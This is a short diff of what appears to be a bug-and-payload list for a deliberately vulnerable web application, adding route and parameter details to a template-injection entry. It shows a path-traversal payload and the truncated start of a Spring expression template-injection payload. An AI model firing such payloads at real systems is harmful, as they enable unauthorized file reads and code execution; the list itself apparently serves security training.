@@ -164,8 +164,9 @@ Content-Type: image/svg+xml
 - Params: name
 - payload: "../../templates/home.html"
    
-### 8. GET
+### 8. GET "/home" or GET "/"
 - Bug: Template Injection
+- Params: msg
 - Payload:
 ```
 T(org.apache.commons.io.IOUtils).toString(
